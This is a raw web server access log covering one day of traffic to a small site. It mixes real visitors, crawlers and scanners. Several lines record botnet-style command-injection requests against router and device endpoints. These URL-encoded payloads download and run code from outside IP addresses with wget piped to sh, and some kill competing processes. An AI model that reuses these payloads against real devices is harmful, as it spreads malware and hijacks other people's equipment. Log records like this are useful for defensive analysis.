167.94.146.60 - - [27/Jun/2024:04:26:23 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
167.94.146.60 - - [27/Jun/2024:04:26:28 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [27/Jun/2024:04:26:28 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
167.94.146.60 - - [27/Jun/2024:04:26:28 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.191.127.212 - - [27/Jun/2024:04:36:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
183.207.45.102 - - [27/Jun/2024:04:42:52 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.45.102 - - [27/Jun/2024:04:42:52 +0000] "GET /static/js/main.b29e2815.js HTTP/1.1" 200 38570646 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.45.102 - - [27/Jun/2024:04:42:52 +0000] "GET /static/css/main.a2f3fdb2.css HTTP/1.1" 200 367039 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.45.102 - - [27/Jun/2024:04:42:54 +0000] "GET /manifest.json HTTP/1.1" 200 177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.45.102 - - [27/Jun/2024:04:42:54 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
199.45.154.154 - - [27/Jun/2024:05:26:23 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
199.45.154.154 - - [27/Jun/2024:05:26:29 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.154 - - [27/Jun/2024:05:26:31 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
199.45.154.154 - - [27/Jun/2024:05:26:32 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.191.127.212 - - [27/Jun/2024:05:43:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
64.62.197.126 - - [27/Jun/2024:05:55:26 +0000] "\x16\x03\x01" 400 226 "-" "-"
141.98.83.197 - - [27/Jun/2024:07:03:03 +0000] "POST /cgi-bin/skk_set.cgi HTTP/1.1" 404 217 "-" "Go-http-client/1.1"
185.191.127.212 - - [27/Jun/2024:07:06:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
115.22.105.216 - - [27/Jun/2024:07:14:20 +0000] "GET /manager/html HTTP/1.1" 200 748 "-" "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705"
115.22.105.216 - - [27/Jun/2024:07:14:20 +0000] "\x16\x03\x01" 400 226 "-" "-"
115.22.105.216 - - [27/Jun/2024:07:14:21 +0000] "\x16\x03\x01" 400 226 "-" "-"
80.75.212.207 - - [27/Jun/2024:07:24:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 200 748 "http://34.23.233.23:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.79.172.21 - - [27/Jun/2024:07:46:16 +0000] "\x16\x03\x01" 400 226 "-" "-"
185.224.128.43 - - [27/Jun/2024:07:58:12 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.127.212 - - [27/Jun/2024:08:04:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
205.210.31.27 - - [27/Jun/2024:08:22:46 +0000] "GET / HTTP/1.1" 200 748 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.198.204.194 - - [27/Jun/2024:08:28:30 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 748 "-" "Mozilla/5.0"
143.198.204.194 - - [27/Jun/2024:08:28:42 +0000] "\x16\x03\x01\x01\x07\x01" 400 226 "-" "-"
167.71.201.139 - - [27/Jun/2024:08:31:47 +0000] "GET /cdn-cgi/trace HTTP/1.1" 200 748 "-" "Mozilla/5.0"
167.71.201.139 - - [27/Jun/2024:08:32:07 +0000] "\x16\x03\x01\x01\x07\x01" 400 226 "-" "-"
185.191.127.212 - - [27/Jun/2024:08:41:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
104.152.52.222 - - [27/Jun/2024:08:57:24 +0000] "GET / HTTP/1.0" 200 748 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
185.191.127.212 - - [27/Jun/2024:09:33:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
172.104.11.34 - - [27/Jun/2024:10:06:17 +0000] "\x16\x03\x01" 400 226 "-" "-"
71.6.134.233 - - [27/Jun/2024:10:10:27 +0000] "\x16\x03\x01" 400 226 "-" "-"
40.77.167.108 - - [27/Jun/2024:10:23:55 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
52.167.144.23 - - [27/Jun/2024:10:24:06 +0000] "GET /MEATSTORE/ HTTP/1.1" 503 299 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
71.6.134.233 - - [27/Jun/2024:10:27:37 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
71.6.134.233 - - [27/Jun/2024:10:28:58 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:26 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:27 +0000] "GET /static/css/main.a2f3fdb2.css HTTP/1.1" 200 367039 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:27 +0000] "GET /static/js/main.b29e2815.js HTTP/1.1" 200 38570646 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:37:45 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
::1 - - [27/Jun/2024:10:37:52 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
106.102.11.112 - - [27/Jun/2024:10:38:06 +0000] "GET /static/media/smile1.e1d275084022ed4384d8.webp HTTP/1.1" 200 5966 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:06 +0000] "GET /static/media/common3_2.8f0a0f8bd6052da1ac43.webp HTTP/1.1" 200 2901 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:06 +0000] "GET /static/media/common3_1.9d98ba7e31f409e5b48f.webp HTTP/1.1" 200 4422 "http://www.junghomun.com/money/dash/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:15 +0000] "GET /static/media/common1.7c741a6f0a021e66a3be.webp HTTP/1.1" 200 8012 "http://www.junghomun.com/sleep/diff/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:16 +0000] "GET /static/media/sleep2.91ca02f32a08409ecde2.webp HTTP/1.1" 200 9524 "http://www.junghomun.com/sleep/diff/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:16 +0000] "GET /static/media/sleep4.0a532811004c7b89c0ba.webp HTTP/1.1" 200 10852 "http://www.junghomun.com/sleep/diff/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
106.102.11.112 - - [27/Jun/2024:10:38:16 +0000] "GET /static/media/sleep3.e5053303883ccf2fcb0d.webp HTTP/1.1" 200 10530 "http://www.junghomun.com/sleep/diff/list" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
141.98.11.79 - - [27/Jun/2024:10:46:00 +0000] "CONNECT google.com:443 HTTP/1.1" 405 235 "-" "Go-http-client/1.1"
198.235.24.150 - - [27/Jun/2024:10:53:12 +0000] "\x16\x03\x01" 400 226 "-" "-"
198.235.24.150 - - [27/Jun/2024:10:53:12 +0000] "\x16\x03\x01" 400 226 "-" "-"
65.49.20.68 - - [27/Jun/2024:11:05:40 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
65.49.20.68 - - [27/Jun/2024:11:07:51 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
65.49.20.68 - - [27/Jun/2024:11:08:31 +0000] "GET /geoserver/web/ HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
185.191.127.212 - - [27/Jun/2024:11:09:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
141.98.83.197 - - [27/Jun/2024:11:22:53 +0000] "POST /cgi-bin/skk_set.cgi HTTP/1.1" 404 217 "-" "Go-http-client/1.1"
198.23.165.253 - - [27/Jun/2024:11:25:35 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 200 748 "http://34.23.233.23:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
141.98.83.197 - - [27/Jun/2024:11:38:32 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
141.98.83.197 - - [27/Jun/2024:11:38:33 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
183.207.48.133 - - [27/Jun/2024:11:42:46 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.48.133 - - [27/Jun/2024:11:42:47 +0000] "GET /static/js/main.b29e2815.js HTTP/1.1" 200 38570646 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.48.133 - - [27/Jun/2024:11:42:47 +0000] "GET /static/css/main.a2f3fdb2.css HTTP/1.1" 200 367039 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.48.133 - - [27/Jun/2024:11:42:48 +0000] "GET /manifest.json HTTP/1.1" 200 177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
183.207.48.133 - - [27/Jun/2024:11:42:49 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.82.77.202 - - [27/Jun/2024:12:14:12 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
185.224.128.43 - - [27/Jun/2024:12:37:43 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.174 - - [27/Jun/2024:12:38:02 +0000] "POST /cmd,/simZysh/register_main/setCookie HTTP/1.1" 200 748 "-" "Go-http-client/1.1"
185.191.127.212 - - [27/Jun/2024:12:44:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 404 224 "-" "Go-http-client/1.1"
49.170.7.121 - - [27/Jun/2024:12:55:59 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 226 "-" "Hello, World"
106.102.11.41 - - [27/Jun/2024:12:59:45 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:12:59:45 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 200 367042 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:12:59:46 +0000] "GET /static/js/main.4cede9ec.js HTTP/1.1" 200 38572893 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:01 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:02 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:02 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.41 - - [27/Jun/2024:13:00:02 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:16:57 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:16:57 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 304 - "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:16:57 +0000] "GET /static/js/main.4cede9ec.js HTTP/1.1" 304 - "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:16:57 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 304 - "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:11 +0000] "GET /static/css/main.22ac65e9.css.map HTTP/1.1" 200 628227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:19 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.105 - - [27/Jun/2024:13:17:11 +0000] "GET /static/js/main.4cede9ec.js.map HTTP/1.1" 200 58128031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:20 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 200 367042 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:21 +0000] "GET /static/css/main.22ac65e9.css.map HTTP/1.1" 200 628227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:20 +0000] "GET /static/js/main.4cede9ec.js HTTP/1.1" 200 38572893 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:26 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:27 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:17:26 +0000] "GET /static/js/main.4cede9ec.js.map HTTP/1.1" 200 58128031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:26:51 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:26:52 +0000] "GET /static/css/main.22ac65e9.css HTTP/1.1" 200 367042 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:27:02 +0000] "GET /static/css/main.22ac65e9.css.map HTTP/1.1" 200 628227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:26:57 +0000] "GET /static/js/main.4cede9ec.js HTTP/1.1" 200 38572893 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.33 - - [27/Jun/2024:13:27:14 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
